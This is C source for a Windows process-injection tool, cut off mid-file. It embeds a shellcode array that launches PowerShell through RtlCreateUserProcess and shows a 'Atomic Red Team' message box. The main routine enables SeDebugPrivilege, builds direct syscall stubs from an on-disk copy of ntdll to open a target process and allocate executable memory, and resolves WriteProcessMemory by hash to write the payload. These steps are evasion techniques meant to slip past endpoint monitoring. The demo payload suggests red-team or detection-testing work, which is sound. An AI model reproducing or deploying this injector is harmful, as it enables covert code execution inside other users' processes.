0x04,0x81,0x48,0x8b,0x8d,0x18,0x03,0x00,0x00,0x48,
0x8b,0x55,0x10,0x48,0x39,0x14,0x01,0x74,0x10,0x8b,
0x85,0x38,0x03,0x00,0x00,0xff,0xc0,0x89,0x85,0x38,
0x03,0x00,0x00,0xeb,0xcd,0x48,0x8b,0x85,0x28,0x03,
0x00,0x00,0x8b,0x40,0x24,0x48,0x8b,0x8d,0x18,0x03,
0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,
0x85,0x40,0x03,0x00,0x00,0x48,0x8b,0x85,0x28,0x03,
0x00,0x00,0x8b,0x40,0x1c,0x48,0x8b,0x8d,0x18,0x03,
0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,
0x85,0x48,0x03,0x00,0x00,0x48,0x63,0x85,0x38,0x03,
0x00,0x00,0x48,0x8b,0x8d,0x40,0x03,0x00,0x00,0x48,
0x0f,0xbf,0x04,0x41,0x48,0x8b,0x8d,0x48,0x03,0x00,
0x00,0x48,0x63,0x04,0x81,0x48,0x8b,0x8d,0x18,0x03,
0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,
0x85,0x50,0x03,0x00,0x00,0x48,0x8b,0x85,0x18,0x03,
0x00,0x00,0x48,0x89,0x85,0x58,0x03,0x00,0x00,0x48,
0x8b,0x85,0xf8,0x02,0x00,0x00,0x48,0x89,0x85,0x60,
0x03,0x00,0x00,0x48,0x8b,0x85,0x60,0x03,0x00,0x00,
0xc7,0x80,0x14,0x01,0x00,0x00,0xff,0xff,0xff,0xff,
0x48,0x8b,0x85,0xf8,0x02,0x00,0x00,0x48,0x8b,0x40,
0x30,0x48,0x89,0x85,0x68,0x03,0x00,0x00,0x48,0xb8,
0x4c,0x6f,0x61,0x64,0x4c,0x69,0x62,0x72,0x48,0x89,
0x45,0x10,0x48,0xc7,0x45,0x18,0x61,0x72,0x79,0x41,
0x48,0x8d,0x55,0x10,0x48,0x8b,0x8d,0x58,0x03,0x00,
0x00,0xff,0x95,0x50,0x03,0x00,0x00,0x48,0x89,0x85,
0x70,0x03,0x00,0x00,0x48,0xb8,0x52,0x74,0x6c,0x41,
0x6c,0x6c,0x6f,0x63,0x48,0x89,0x45,0x10,0x48,0xb8,
0x61,0x74,0x65,0x48,0x65,0x61,0x70,0x00,0x48,0x89,
0x45,0x18,0x48,0x8d,0x55,0x10,0x48,0x8b,0x8d,0x68,
0x03,0x00,0x00,0xff,0x95,0x50,0x03,0x00,0x00,0x48,
0x89,0x85,0x78,0x03,0x00,0x00,0x48,0xb8,0x52,0x74,
0x6c,0x43,0x72,0x65,0x61,0x74,0x48,0x89,0x45,0x38,
0x48,0xb8,0x65,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,
0x48,0x89,0x45,0x40,0x48,0xb8,0x50,0x61,0x72,0x61,
0x6d,0x65,0x74,0x65,0x48,0x89,0x45,0x48,0x48,0xc7,
0x45,0x50,0x72,0x73,0x45,0x78,0x48,0x8d,0x55,0x38,
0x48,0x8b,0x8d,0x68,0x03,0x00,0x00,0xff,0x95,0x50,
0x03,0x00,0x00,0x48,0x89,0x85,0x80,0x03,0x00,0x00,
0x48,0xb8,0x4e,0x74,0x43,0x72,0x65,0x61,0x74,0x65,
0x48,0x89,0x45,0x20,0x48,0xb8,0x55,0x73,0x65,0x72,
0x50,0x72,0x6f,0x63,0x48,0x89,0x45,0x28,0x48,0xc7,
0x45,0x30,0x65,0x73,0x73,0x00,0x48,0x8d,0x55,0x20,
0x48,0x8b,0x8d,0x68,0x03,0x00,0x00,0xff,0x95,0x50,
0x03,0x00,0x00,0x48,0x89,0x85,0x88,0x03,0x00,0x00,
0x48,0xb8,0x52,0x74,0x6c,0x49,0x6e,0x69,0x74,0x55,
0x48,0x89,0x45,0x20,0x48,0xb8,0x6e,0x69,0x63,0x6f,
0x64,0x65,0x53,0x74,0x48,0x89,0x45,0x28,0x48,0xc7,
0x45,0x30,0x72,0x69,0x6e,0x67,0x48,0x8d,0x55,0x20,
0x48,0x8b,0x8d,0x68,0x03,0x00,0x00,0xff,0x95,0x50,
0x03,0x00,0x00,0x48,0x89,0x85,0x90,0x03,0x00,0x00,
0x48,0xb8,0x5c,0x00,0x3f,0x00,0x3f,0x00,0x5c,0x00,
0x48,0x89,0x45,0x60,0x48,0xb8,0x43,0x00,0x3a,0x00,
0x5c,0x00,0x57,0x00,0x48,0x89,0x45,0x68,0x48,0xb8,
0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x48,0x89,
0x45,0x70,0x48,0xb8,0x77,0x00,0x73,0x00,0x5c,0x00,
0x53,0x00,0x48,0x89,0x45,0x78,0x48,0xb8,0x79,0x00,
0x73,0x00,0x74,0x00,0x65,0x00,0x48,0x89,0x85,0x80,
0x00,0x00,0x00,0x48,0xb8,0x6d,0x00,0x33,0x00,0x32,
0x00,0x5c,0x00,0x48,0x89,0x85,0x88,0x00,0x00,0x00,
0x48,0xb8,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,
0x48,0x89,0x85,0x90,0x00,0x00,0x00,0x48,0xb8,0x6f,
0x00,0x77,0x00,0x73,0x00,0x50,0x00,0x48,0x89,0x85,
0x98,0x00,0x00,0x00,0x48,0xb8,0x6f,0x00,0x77,0x00,
0x65,0x00,0x72,0x00,0x48,0x89,0x85,0xa0,0x00,0x00,
0x00,0x48,0xb8,0x53,0x00,0x68,0x00,0x65,0x00,0x6c,
0x00,0x48,0x89,0x85,0xa8,0x00,0x00,0x00,0x48,0xb8,
0x6c,0x00,0x5c,0x00,0x76,0x00,0x31,0x00,0x48,0x89,
0x85,0xb0,0x00,0x00,0x00,0x48,0xb8,0x2e,0x00,0x30,
0x00,0x5c,0x00,0x70,0x00,0x48,0x89,0x85,0xb8,0x00,
0x00,0x00,0x48,0xb8,0x6f,0x00,0x77,0x00,0x65,0x00,
0x72,0x00,0x48,0x89,0x85,0xc0,0x00,0x00,0x00,0x48,
0xb8,0x73,0x00,0x68,0x00,0x65,0x00,0x6c,0x00,0x48,
0x89,0x85,0xc8,0x00,0x00,0x00,0x48,0xb8,0x6c,0x00,
0x2e,0x00,0x65,0x00,0x78,0x00,0x48,0x89,0x85,0xd0,
0x00,0x00,0x00,0x48,0xc7,0x85,0xd8,0x00,0x00,0x00,
0x65,0x00,0x00,0x00,0x48,0x8d,0x55,0x60,0x48,0x8d,
0x8d,0x98,0x03,0x00,0x00,0xff,0x95,0x90,0x03,0x00,
0x00,0x48,0xb8,0x5c,0x00,0x3f,0x00,0x3f,0x00,0x5c,
0x00,0x48,0x89,0x85,0xe0,0x00,0x00,0x00,0x48,0xb8,
0x43,0x00,0x3a,0x00,0x5c,0x00,0x57,0x00,0x48,0x89,
0x85,0xe8,0x00,0x00,0x00,0x48,0xb8,0x69,0x00,0x6e,
0x00,0x64,0x00,0x6f,0x00,0x48,0x89,0x85,0xf0,0x00,
0x00,0x00,0x48,0xb8,0x77,0x00,0x73,0x00,0x5c,0x00,
0x53,0x00,0x48,0x89,0x85,0xf8,0x00,0x00,0x00,0x48,
0xb8,0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,0x48,
0x89,0x85,0x00,0x01,0x00,0x00,0x48,0xb8,0x6d,0x00,
0x33,0x00,0x32,0x00,0x5c,0x00,0x48,0x89,0x85,0x08,
0x01,0x00,0x00,0x48,0xb8,0x57,0x00,0x69,0x00,0x6e,
0x00,0x64,0x00,0x48,0x89,0x85,0x10,0x01,0x00,0x00,
0x48,0xb8,0x6f,0x00,0x77,0x00,0x73,0x00,0x50,0x00,
0x48,0x89,0x85,0x18,0x01,0x00,0x00,0x48,0xb8,0x6f,
0x00,0x77,0x00,0x65,0x00,0x72,0x00,0x48,0x89,0x85,
0x20,0x01,0x00,0x00,0x48,0xb8,0x53,0x00,0x68,0x00,
0x65,0x00,0x6c,0x00,0x48,0x89,0x85,0x28,0x01,0x00,
0x00,0x48,0xb8,0x6c,0x00,0x5c,0x00,0x76,0x00,0x31,
0x00,0x48,0x89,0x85,0x30,0x01,0x00,0x00,0x48,0xb8,
0x2e,0x00,0x30,0x00,0x5c,0x00,0x70,0x00,0x48,0x89,
0x85,0x38,0x01,0x00,0x00,0x48,0xb8,0x6f,0x00,0x77,
0x00,0x65,0x00,0x72,0x00,0x48,0x89,0x85,0x40,0x01,
0x00,0x00,0x48,0xb8,0x73,0x00,0x68,0x00,0x65,0x00,
0x6c,0x00,0x48,0x89,0x85,0x48,0x01,0x00,0x00,0x48,
0xb8,0x6c,0x00,0x2e,0x00,0x65,0x00,0x78,0x00,0x48,
0x89,0x85,0x50,0x01,0x00,0x00,0x48,0xb8,0x65,0x00,
0x20,0x00,0x2d,0x00,0x43,0x00,0x48,0x89,0x85,0x58,
0x01,0x00,0x00,0x48,0xb8,0x6f,0x00,0x6d,0x00,0x6d,
0x00,0x61,0x00,0x48,0x89,0x85,0x60,0x01,0x00,0x00,
0x48,0xb8,0x6e,0x00,0x64,0x00,0x20,0x00,0x22,0x00,
0x48,0x89,0x85,0x68,0x01,0x00,0x00,0x48,0xb8,0x41,
0x00,0x64,0x00,0x64,0x00,0x2d,0x00,0x48,0x89,0x85,
0x70,0x01,0x00,0x00,0x48,0xb8,0x54,0x00,0x79,0x00,
0x70,0x00,0x65,0x00,0x48,0x89,0x85,0x78,0x01,0x00,
0x00,0x48,0xb8,0x20,0x00,0x2d,0x00,0x41,0x00,0x73,
0x00,0x48,0x89,0x85,0x80,0x01,0x00,0x00,0x48,0xb8,
0x73,0x00,0x65,0x00,0x6d,0x00,0x62,0x00,0x48,0x89,
0x85,0x88,0x01,0x00,0x00,0x48,0xb8,0x6c,0x00,0x79,
0x00,0x4e,0x00,0x61,0x00,0x48,0x89,0x85,0x90,0x01,
0x00,0x00,0x48,0xb8,0x6d,0x00,0x65,0x00,0x20,0x00,
0x50,0x00,0x48,0x89,0x85,0x98,0x01,0x00,0x00,0x48,
0xb8,0x72,0x00,0x65,0x00,0x73,0x00,0x65,0x00,0x48,
0x89,0x85,0xa0,0x01,0x00,0x00,0x48,0xb8,0x6e,0x00,
0x74,0x00,0x61,0x00,0x74,0x00,0x48,0x89,0x85,0xa8,
0x01,0x00,0x00,0x48,0xb8,0x69,0x00,0x6f,0x00,0x6e,
0x00,0x46,0x00,0x48,0x89,0x85,0xb0,0x01,0x00,0x00,
0x48,0xb8,0x72,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,
0x48,0x89,0x85,0xb8,0x01,0x00,0x00,0x48,0xb8,0x77,
0x00,0x6f,0x00,0x72,0x00,0x6b,0x00,0x48,0x89,0x85,
0xc0,0x01,0x00,0x00,0x48,0xb8,0x3b,0x00,0x20,0x00,
0x5b,0x00,0x53,0x00,0x48,0x89,0x85,0xc8,0x01,0x00,
0x00,0x48,0xb8,0x79,0x00,0x73,0x00,0x74,0x00,0x65,
0x00,0x48,0x89,0x85,0xd0,0x01,0x00,0x00,0x48,0xb8,
0x6d,0x00,0x2e,0x00,0x57,0x00,0x69,0x00,0x48,0x89,
0x85,0xd8,0x01,0x00,0x00,0x48,0xb8,0x6e,0x00,0x64,
0x00,0x6f,0x00,0x77,0x00,0x48,0x89,0x85,0xe0,0x01,
0x00,0x00,0x48,0xb8,0x73,0x00,0x2e,0x00,0x4d,0x00,
0x65,0x00,0x48,0x89,0x85,0xe8,0x01,0x00,0x00,0x48,
0xb8,0x73,0x00,0x73,0x00,0x61,0x00,0x67,0x00,0x48,
0x89,0x85,0xf0,0x01,0x00,0x00,0x48,0xb8,0x65,0x00,
0x42,0x00,0x6f,0x00,0x78,0x00,0x48,0x89,0x85,0xf8,
0x01,0x00,0x00,0x48,0xb8,0x5d,0x00,0x3a,0x00,0x3a,
0x00,0x53,0x00,0x48,0x89,0x85,0x00,0x02,0x00,0x00,
0x48,0xb8,0x68,0x00,0x6f,0x00,0x77,0x00,0x28,0x00,
0x48,0x89,0x85,0x08,0x02,0x00,0x00,0x48,0xb8,0x27,
0x00,0x41,0x00,0x74,0x00,0x6f,0x00,0x48,0x89,0x85,
0x10,0x02,0x00,0x00,0x48,0xb8,0x6d,0x00,0x69,0x00,
0x63,0x00,0x20,0x00,0x48,0x89,0x85,0x18,0x02,0x00,
0x00,0x48,0xb8,0x52,0x00,0x65,0x00,0x64,0x00,0x20,
0x00,0x48,0x89,0x85,0x20,0x02,0x00,0x00,0x48,0xb8,
0x54,0x00,0x65,0x00,0x61,0x00,0x6d,0x00,0x48,0x89,
0x85,0x28,0x02,0x00,0x00,0x48,0xb8,0x27,0x00,0x2c,
0x00,0x20,0x00,0x27,0x00,0x48,0x89,0x85,0x30,0x02,
0x00,0x00,0x48,0xb8,0x57,0x00,0x61,0x00,0x72,0x00,
0x6e,0x00,0x48,0x89,0x85,0x38,0x02,0x00,0x00,0x48,
0xb8,0x69,0x00,0x6e,0x00,0x67,0x00,0x27,0x00,0x48,
0x89,0x85,0x40,0x02,0x00,0x00,0x48,0xb8,0x2c,0x00,
0x20,0x00,0x27,0x00,0x4f,0x00,0x48,0x89,0x85,0x48,
0x02,0x00,0x00,0x48,0xb8,0x4b,0x00,0x27,0x00,0x2c,
0x00,0x20,0x00,0x48,0x89,0x85,0x50,0x02,0x00,0x00,
0x48,0xb8,0x27,0x00,0x57,0x00,0x61,0x00,0x72,0x00,
0x48,0x89,0x85,0x58,0x02,0x00,0x00,0x48,0xb8,0x6e,
0x00,0x69,0x00,0x6e,0x00,0x67,0x00,0x48,0x89,0x85,
0x60,0x02,0x00,0x00,0x48,0xb8,0x27,0x00,0x29,0x00,
0x3b,0x00,0x20,0x00,0x48,0x89,0x85,0x68,0x02,0x00,
0x00,0x48,0xb8,0x53,0x00,0x74,0x00,0x61,0x00,0x72,
0x00,0x48,0x89,0x85,0x70,0x02,0x00,0x00,0x48,0xb8,
0x74,0x00,0x2d,0x00,0x50,0x00,0x72,0x00,0x48,0x89,
0x85,0x78,0x02,0x00,0x00,0x48,0xb8,0x6f,0x00,0x63,
0x00,0x65,0x00,0x73,0x00,0x48,0x89,0x85,0x80,0x02,
0x00,0x00,0x48,0xb8,0x73,0x00,0x20,0x00,0x27,0x00,
0x6e,0x00,0x48,0x89,0x85,0x88,0x02,0x00,0x00,0x48,
0xb8,0x6f,0x00,0x74,0x00,0x65,0x00,0x70,0x00,0x48,
0x89,0x85,0x90,0x02,0x00,0x00,0x48,0xb8,0x61,0x00,
0x64,0x00,0x2e,0x00,0x65,0x00,0x48,0x89,0x85,0x98,
0x02,0x00,0x00,0x48,0xb8,0x78,0x00,0x65,0x00,0x27,
0x00,0x22,0x00,0x48,0x89,0x85,0xa0,0x02,0x00,0x00,
0x48,0x8d,0x95,0xe0,0x00,0x00,0x00,0x48,0x8d,0x8d,
0xa8,0x03,0x00,0x00,0xff,0x95,0x90,0x03,0x00,0x00,
0x48,0xc7,0x85,0xb8,0x03,0x00,0x00,0x00,0x00,0x00,
0x00,0xc7,0x44,0x24,0x50,0x01,0x00,0x00,0x00,0x48,
0xc7,0x44,0x24,0x48,0x00,0x00,0x00,0x00,0x48,0xc7,
0x44,0x24,0x40,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,
0x24,0x38,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,
0x30,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x28,
0x00,0x00,0x00,0x00,0x48,0x8d,0x85,0xa8,0x03,0x00,
0x00,0x48,0x89,0x44,0x24,0x20,0x45,0x33,0xc9,0x45,
0x33,0xc0,0x48,0x8d,0x95,0x98,0x03,0x00,0x00,0x48,
0x8d,0x8d,0xb8,0x03,0x00,0x00,0xff,0x95,0x80,0x03,
0x00,0x00,0x48,0x8d,0x85,0xc0,0x03,0x00,0x00,0x48,
0x8b,0xf8,0x33,0xc0,0xb9,0x58,0x00,0x00,0x00,0xf3,
0xaa,0x48,0xc7,0x85,0xc0,0x03,0x00,0x00,0x58,0x00,
0x00,0x00,0xc7,0x85,0xc8,0x03,0x00,0x00,0x00,0x00,
0x00,0x00,0xb8,0x08,0x00,0x00,0x00,0x48,0x6b,0xc0,
0x01,0x41,0xb8,0x20,0x00,0x00,0x00,0xba,0x08,0x00,
0x00,0x00,0x48,0x8b,0x4d,0x00,0x48,0x8b,0x4c,0x01,
0x28,0xff,0x95,0x78,0x03,0x00,0x00,0x48,0x89,0x85,
0x20,0x04,0x00,0x00,0x48,0x8b,0x85,0x20,0x04,0x00,
0x00,0x48,0xc7,0x00,0x28,0x00,0x00,0x00,0xb8,0x20,
0x00,0x00,0x00,0x48,0x6b,0xc0,0x00,0x48,0x8b,0x8d,
0x20,0x04,0x00,0x00,0xc7,0x44,0x01,0x08,0x05,0x00,
0x02,0x00,0xb8,0x20,0x00,0x00,0x00,0x48,0x6b,0xc0,
0x00,0x0f,0xb7,0x8d,0x98,0x03,0x00,0x00,0x48,0x8b,
0x95,0x20,0x04,0x00,0x00,0x48,0x89,0x4c,0x02,0x10,
0xb8,0x20,0x00,0x00,0x00,0x48,0x6b,0xc0,0x00,0x48,
0x8b,0x8d,0x20,0x04,0x00,0x00,0x48,0x8b,0x95,0xa0,
0x03,0x00,0x00,0x48,0x89,0x54,0x01,0x18,0x48,0xc7,
0x85,0x30,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x48,
0x8b,0x85,0x20,0x04,0x00,0x00,0x48,0x89,0x44,0x24,
0x50,0x48,0x8d,0x85,0xc0,0x03,0x00,0x00,0x48,0x89,
0x44,0x24,0x48,0x48,0x8b,0x85,0xb8,0x03,0x00,0x00,
0x48,0x89,0x44,0x24,0x40,0xc7,0x44,0x24,0x38,0x00,
0x00,0x00,0x00,0xc7,0x44,0x24,0x30,0x00,0x00,0x00,
0x00,0x48,0xc7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,
0x48,0xc7,0x44,0x24,0x20,0x00,0x00,0x00,0x00,0x41,
0xb9,0xff,0xff,0x1f,0x00,0x41,0xb8,0xff,0xff,0x1f,
0x00,0x48,0x8d,0x95,0x30,0x04,0x00,0x00,0x48,0x8d,
0x8d,0x28,0x04,0x00,0x00,0xff,0x95,0x88,0x03,0x00,
0x00,0x89,0x85,0x38,0x04,0x00,0x00,0x48,0xb8,0x4e,
0x74,0x53,0x75,0x73,0x70,0x65,0x6e,0x48,0x89,0x45,
0x10,0x48,0xb8,0x64,0x54,0x68,0x72,0x65,0x61,0x64,
0x00,0x48,0x89,0x45,0x18,0x48,0x8d,0x55,0x10,0x48,
0x8b,0x8d,0x68,0x03,0x00,0x00,0xff,0x95,0x50,0x03,
0x00,0x00,0x48,0x89,0x85,0x40,0x04,0x00,0x00,0x33,
0xd2,0x48,0xc7,0xc1,0xfe,0xff,0xff,0xff,0xff,0x95,
0x40,0x04,0x00,0x00,0x48,0x8d,0xa5,0x18,0x05,0x00,
0x00,0x5f,0x5d,0xc3
};


int main(int argc, char *argv[]) {


    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        printf("[-] Failed to load kernel32.dll.\n");
        return -1;
    }

    // Load ntdll.dll and retrieve its handle
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        printf("[-] Failed to load ntdll.dll.\n");
        return -1;
    }

    PFN_GETLASTERROR pGetLastError = (PFN_GETLASTERROR)GetProcAddress(hKernel32, "GetLastError");

    if (!EnableWindowsPrivilege(L"SeDebugPrivilege")) {
        printf("[-]Failed to enable SeDebugPrivilege. You might not have sufficient permissions.\n");
        return -1;
    }

    // Target process information:
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    DWORD pid = 0;
    char notepadPath[256] = {0};  // Initialize the buffer

    int step = -1; // Default value indicating 'step' is not set
    PVOID remoteBuffer = NULL; // Pointer to remoteBuffer
    BOOL pidProvided = FALSE, stepProvided = FALSE, bufferProvided = FALSE;



    // if (argc != 2) {
    //     printf("Usage: %s <PID>\n", argv[0], "running with default notepad");

    //     if (IsSystem64Bit()) {
    //         printf("[*] system is 64 bit\n");
    //         strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
    //     } else {
    //         printf("[*] system is 32 bit\n");
    //         strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
    //     }

    //     printf("[*] notepad path: %s\n", notepadPath); 

    //     BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    //     if (!success) {
    //         MessageBox(NULL, "[-]Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
    //         DWORD error = GetLastError();
    //         printf("[-]Failed to launch Notepad. Error: %d\n", error);
    //         return 1;
    //     }
    //     pid = pi.dwProcessId;
        
    // } else {
    //     printf("[*]PID provided: %s\n", argv[1]);
    //     pid = atoi(argv[1]);
    // }
////////////////////////////////////////////////////////
    // Parse command line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-pid") == 0 && i + 1 < argc) {
            pid = atoi(argv[++i]);
            pidProvided = TRUE;
        } else if (strcmp(argv[i], "-step") == 0 && i + 1 < argc) {
            step = atoi(argv[++i]);
            if (step < 1 || step > 3) {
                printf("Invalid step value: %d. Valid values are 1, 2, or 3. Default action will be taken.\n", step);
                step = -1; // Reset step to indicate invalid or not provided
            } else {
                stepProvided = TRUE;
            }
        } else if (strcmp(argv[i], "-buffer") == 0 && i + 1 < argc) {
            if (sscanf(argv[++i], "%p", &remoteBuffer) != 1) {
                printf("Invalid buffer address. Ensure it is a valid pointer value.\n");
                remoteBuffer = NULL; // Reset to NULL to indicate parsing failure
            } else {
                bufferProvided = TRUE;
            }
        }
    }

    // Validate command line arguments
    if (!pidProvided || !stepProvided || !bufferProvided) {
        // Default action or PID alone
        if (!pidProvided) {

            printf("Usage: %s -pid <PID> -step <1|2|3> -buffer <address>\n if no argument supplied, run in default mode\n", argv[0]);
            printf("Running with default notepad due to insufficient parameters.\n");

            // Determine the correct Notepad path based on system architecture
            if (IsSystem64Bit()) {
                strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\System32\\notepad.exe");
            } else {
                strcpy_s(notepadPath, sizeof(notepadPath), "C:\\Windows\\SysWOW64\\notepad.exe");
            }

            // Attempt to create a process with Notepad
            BOOL success = CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            if (!success) {
                MessageBox(NULL, "Failed to start Notepad.", "Error", MB_OK | MB_ICONERROR);
                return 1; // Exit if unable to start Notepad
            }
            printf("Notepad started with default settings.\n");
            pid = pi.dwProcessId;

        } else {
            printf("PID provided without -step and -buffer. Proceeding with PID: %lu\n", pid);
            pid = atoi(argv[1]);
        }
    } else {
        // All required parameters are provided
        printf("PID: %lu, Step: %d, Buffer Address: %p\n", pid, step, remoteBuffer);
        // Proceed with the logic using PID, step, and buffer
    }

//////////////////////////////////////////





    Sleep(1000);
    printf("[*]target process PID: %d\n", pid);

     // Get the handle to the default loaded ntdll.dll in the process
    HMODULE hNtdllDefault = GetModuleHandleA("ntdll.dll");
    if (hNtdllDefault == NULL) {
        printf("[-] Failed to get handle of the default loaded ntdll.dll.\n");
        return -1;
    } else {
        printf("[+] Memory address of the default loaded ntdll.dll: %p\n", hNtdllDefault);
    }

	char syscallStub[SYSCALL_STUB_SIZE] = {}; //need once, instead of having multiple locations we can reuse this stub for every function.
	SIZE_T bytesWritten = 0;
	DWORD oldProtection = 0; //need once. 
	HANDLE file = NULL;
	DWORD fileSize = 0;  
	DWORD bytesRead = 0;  
	LPVOID fileData = NULL;
	
	OBJECT_ATTRIBUTES oa;
	HANDLE fileHandle = NULL;
	NTSTATUS status = 0;  
	IO_STATUS_BLOCK osb;
	ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK));

    // This part should be only called once to load the info of ntdll.dll. 
	file = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	fileSize = GetFileSize(file, NULL);
	fileData = HeapAlloc(GetProcessHeap(), 0, fileSize);
	ReadFile(file, fileData, fileSize, &bytesRead, NULL);
    printf("[+] Memory location of loaded ntdll.dll: %p\n", fileData);


	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew);
	DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);
	PIMAGE_SECTION_HEADER textSection = section;
	PIMAGE_SECTION_HEADER rdataSection = section;
    // This part should be only called once to load the info of ntdll.dll. 

    bool rdataSectionFound = false;

    for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++) 
    {
        if (strcmp((CHAR*)section->Name, (CHAR*)".rdata") == 0) { 
            rdataSection = section;
            printf("[+] .rdata section found.\n");
            rdataSectionFound = true;
            break;
        }
        section++;
    }

    if (!rdataSectionFound) {
        printf("[-] .rdata section not found.\n");
    }

	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);

    ///*********************************************************************************
    // open process:

    myNtOpenProcess NtOpenProcess = (myNtOpenProcess)(LPVOID)syscallStub;
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
    // Open the target process
    HANDLE processHandle;
    CLIENT_ID clientId = { reinterpret_cast<HANDLE>(pid), nullptr };
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, nullptr, 0, nullptr, nullptr);

	if (GetSyscallStub("NtOpenProcess", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
        printf("[+] Memory location of NtOpenProcess syscall stub outwith EAT: %p\n", (void*)NtOpenProcess);

        NTSTATUS status = NtOpenProcess(&processHandle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
        if (status != STATUS_SUCCESS) {
            printf("[-] NtOpenProcess failed.\n");
            return -1;
        }
        printf("[+] NtOpenProcess succeeded.\n");
        /// In 3 fingers death punch, the process handle will vary signifies the different process to strike. 
        printf("[+] Process handle: %IX\n", (SIZE_T)processHandle);
    } else {
        printf("[-] Failed to execute NtOpenProcess.\n");
    }
    // Change the protection of the syscall stub back to its original protection
    VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
    printf("[+] Memory location of NtOpenProcess syscall stub: %p\n", (void*)NtOpenProcess);
    printf("[*] old protection: %d\n", oldProtection);
    
    
    
    ///*********************************************************************************
    if (step == -1 || step == 1) {

        // virtual allocate:
        myNtAllocateVirtualMemory NtVirtualAlloc = (myNtAllocateVirtualMemory)(LPVOID)syscallStub;
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);

        // arguments needed for NtAllocateVirtualMemory
        // PVOID remoteBuffer = nullptr;
        SIZE_T magiccodeSize = sizeof(magiccode);

        if (GetSyscallStub("NtAllocateVirtualMemory", exportDirectory, fileData, textSection, rdataSection, syscallStub)) {
            printf("[+] Memory location of NtAllocateVirtualMemory syscall stub outwith EAT: %p\n", (void*)NtVirtualAlloc);

            status = NtVirtualAlloc(processHandle, &remoteBuffer, 0, &magiccodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (status != STATUS_SUCCESS) {
                printf("[-] NtAllocateVirtualMemory failed.\n");
                return -1;
            }
            printf("[+] NtAllocateVirtualMemory succeeded.\n");
            printf("[+] Process handle: %IX\n", (SIZE_T)processHandle);
        } else {
            printf("[-] Failed to execute NtAllocateVirtualMemory.\n");
        }

        // Change the protection of the syscall stub back to its original protection
        VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, oldProtection, &oldProtection);
        printf("[*] old protection: %d\n", oldProtection);
        if(step == 1) {
            printf("[*] ATTENTION: step 1, Sifu will strike the 1st blow! \n");
            printf("[******] ATTENTION: remoteBuffer: 0x%p\n", remoteBuffer);
            printf("[******] ATTENTION: pid to strike: %d\n", pid);
        }


    }
    ///*********************************************************************************

    /// this step can also be devided from the previous calls.
    // virtual memory write:
    if (step == -1 || step == 2) {

        DWORD hashWriteProcessMemory = getHashFromString("WriteProcessMemory");
        printf("[*]Hash of WriteProcessMemory: 0x%lx\n", hashWriteProcessMemory);

        customWriteProcessMemory WriteProcessMemory = (customWriteProcessMemory)getFunctionAddressByHash((char *)"kernel32.dll", hashWriteProcessMemory);

        ULONG bytesWrittens = 0;
        // Write the magiccode to the allocated memory
        if (!WriteProcessMemory(processHandle, remoteBuffer, magiccode, sizeof(magiccode), NULL))
        {
            printf("[-]Error writing to process memory.\n");
            VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
            CloseHandle(processHandle);
            return -1;
        } else {
            printf("[+]Successfully wrote magiccode to the allocated memory.\n");
            if(step == 2) {
                printf("[*] ATTENTION: step 2, Sifu will strike the 2nd blow! \n");
                printf("[******] ATTENTION:  remoteBuffer: 0x%p\n", remoteBuffer);
                printf("[******] ATTENTION: pid to strike: %d\n", pid);
            }   
        }
    }

    ///*********************************************************************************
    ///// As a proof-of-concept, we can run the create remote thread from a seperate process
    /// from the other API functions called to get the addresses of remoteBuffer
    /// as remoteBuffer is the only argument that is needed for NtCreateThreadEx from previous API calls.
    /// We also need to get a new process handle. 
    // create remote thread:
    // Additional function for step == 3
